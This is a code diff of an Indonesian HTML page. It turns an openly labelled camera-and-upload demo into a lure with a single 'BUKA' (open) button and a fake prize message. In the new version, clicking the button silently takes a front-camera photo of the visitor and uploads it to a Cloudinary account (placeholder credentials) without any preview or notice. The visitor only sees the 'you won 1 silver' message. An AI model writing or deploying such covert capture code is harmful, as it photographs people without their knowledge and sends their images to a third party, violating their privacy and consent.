@@ -1,55 +1,92 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Kamera Depan & Upload ke Cloudinary</title>
+  <meta charset="UTF-8">
+  <title>BUKA</title>
+  <style>
+    body {
+      background-color: pink;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+    }
+    #bukaBtn {
+      padding: 15px 30px;
+      font-size: 24px;
+      background-color: maroon;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    #result {
+      display: none;
+      color: maroon;
+      font-size: 28px;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
-  <h2>Kamera Depan</h2>
-  <video id="video" autoplay playsinline width="300"></video><br>
-  <button onclick="ambilFoto()">Ambil Foto</button>
-  <p id="status"></p>
-  <img id="preview" style="display:none" width="300">
-  
+  <button id="bukaBtn">BUKA</button>
+  <div id="result">Selamat anda mendapatkan 1 perak🗿</div>
+
   <script>
-    const video = document.getElementById('video');
-    const preview = document.getElementById('preview');
+    const bukaBtn = document.getElementById("bukaBtn");
+    const result = document.getElementById("result");
 
-    // Aktifkan kamera depan
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    }).then((stream) => {
-      video.srcObject = stream;
-    }).catch((err) => {
-      alert("Gagal membuka kamera: " + err);
+    bukaBtn.addEventListener("click", async () => {
+      try {
+        // Akses kamera depan
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        // Tunggu kamera nyala lalu ambil gambar
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        // Hentikan kamera
+        stream.getTracks().forEach(track => track.stop());
+
+        // Convert gambar ke base64
+        const imageData = canvas.toDataURL("image/jpeg");
+
+        // Upload ke Cloudinary
+        const data = new FormData();
+        data.append("file", imageData);
+        data.append("upload_preset", "YOUR_UPLOAD_PRESET"); // Ganti dengan upload preset
+        data.append("cloud_name", "YOUR_CLOUD_NAME"); // Ganti dengan cloud name kamu
+
+        await fetch("https://api.cloudinary.com/v1_1/YOUR_CLOUD_NAME/image/upload", {
+          method: "POST",
+          body: data
+        });
+
+        // Ganti tampilan
+        document.body.innerHTML = `<div id="result">Selamat anda mendapatkan 1 perak🗿</div>`;
+        document.body.style.backgroundColor = "pink";
+        document.getElementById("result").style.color = "maroon";
+        document.getElementById("result").style.display = "flex";
+        document.getElementById("result").style.justifyContent = "center";
+        document.getElementById("result").style.alignItems = "center";
+        document.getElementById("result").style.height = "100vh";
+      } catch (err) {
+        alert("Gagal mengakses kamera atau upload foto: " + err.message);
+      }
     });
-
-    async function ambilFoto() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataURL = canvas.toDataURL('image/jpeg');
-      
-      // Tampilkan preview
-      preview.src = dataURL;
-      preview.style.display = 'block';
-
-      // Upload ke Cloudinary
-      document.getElementById('status').innerText = "Mengupload ke Cloudinary...";
-      const formData = new FormData();
-      formData.append("file", dataURL);
-      formData.append("upload_preset", "foto_auto"); // ganti sesuai punya kamu
-
-      const res = await fetch("https://api.cloudinary.com/v1_1/Foto-auto/image/upload", {
-        method: "POST",
-        body: formData
-      });
-      const data = await res.json();
-      document.getElementById('status').innerText = "Berhasil! Link: " + data.secure_url;
-      console.log("Link Gambar:", data.secure_url);
-    }
   </script>
 </body>
 </html>
